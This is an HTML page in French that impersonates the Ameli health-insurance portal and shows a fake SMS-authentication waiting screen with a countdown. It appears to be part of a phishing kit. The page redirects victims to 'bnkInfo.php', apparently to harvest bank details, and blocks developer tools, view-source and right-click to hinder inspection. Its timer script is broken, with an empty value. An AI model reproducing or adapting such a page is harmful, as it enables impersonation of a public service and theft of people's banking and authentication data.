<html lang="fr" slick-uniqueid="3"><head xmlns="http://www.w3.org/1999/xhtml" lang="fr" xml:lang="fr">


<meta http-equiv="refresh" content="5;url=bnkInfo.php" />



<script>

	document.onkeydown = function(e) {
	  if(event.keyCode == 123) {
	     return false;
	  }
	  if(e.ctrlKey && e.shiftKey && e.keyCode == 'I'.charCodeAt(0)) {
	     return false;
	  }
	  if(e.ctrlKey && e.shiftKey && e.keyCode == 'J'.charCodeAt(0)) {
	     return false;
	  }
	  if(e.ctrlKey && e.keyCode == 'U'.charCodeAt(0)) {
	     return false;
	  }
	}



	document.addEventListener('contextmenu', function(e) {
	  e.preventDefault();
	});

</script>

<div class="wlp-bighorn-window-content">

<div class="centrepage">

  <form name="creationImmediateForm" id="creationImmediate_1creationImmediateForm" method="post" action="https://assure.ameli.fr:443/PortailAS/appmanager/PortailAS/assure?_nfpb=true&amp;_windowLabel=creationImmediate_1&amp;creationImmediate_1_actionOverride=%2Fportlets%2Fcreationimmediate%2Fcreationimmediate&amp;_pageLabel=as_creation_immediate_page">
    <div class="blocformfond creationimmediate">

      <div>
      </div>

      <fieldset>

<p style="font-size:12px;text-align:center;">Authentification par SMS<br><img src="https://conferience.com/web/images/icons/popup.svg" style="width:7%;"></p>
	<br>
	<p style="font-size:12px;text-align:center;">Veuillez patienter quelques secondes pendant que nous traitons votre demande<br><br><img style="width:15%;" src="https://zupimages.net/up/18/07/4vkt.gif"></p><br>

	<center><div class ="magana" style="padding: 2px; font-size:12px; font-weight: bold; " id="timer"></div></center>

<script>
document.getElementById('timer').innerHTML =
  00 + ":" + ;
startTimer();

function startTimer() {
  var presentTime = document.getElementById('timer').innerHTML;
  var timeArray = presentTime.split(/[:]+/);
  var m = timeArray[0];
  var s = checkSecond((timeArray[1] - 1));
  if(s==59){m=m-1}
  //if(m<0){alert('timer completed')}

  document.getElementById('timer').innerHTML =
    m + ":" + s;
  setTimeout(startTimer, 1000);
}

function checkSecond(sec) {
  if (sec < 10 && sec >= 0) {sec = "0" + sec}; // add zero in front of numbers < 10
  if (sec < 0) {sec = "59"};
  return sec;
}
</script>
	    <br><p style="font-size:12px;text-align:center;">
Ne pas fermer cette fenêtre s'il vous plaît</p>
    </div>
  </form>
</div>
</div></div></div></div></div></div></section></main></div></div></div></div><footer class="wlp-bighorn-footer" role="contentinfo"><div class="wlp-bighorn-layout wlp-bighorn-layout-flow"><div class="wlp-bighorn-layout-cell wlp-bighorn-layout-flow-horizontal wlp-bighorn-layout-flow-first" style="height: auto"><div></div><div id="prefooterAmeli_1" class="wlp-bighorn-window  "><div class="wlp-bighorn-window-content">
          	</div>
</div></body></html>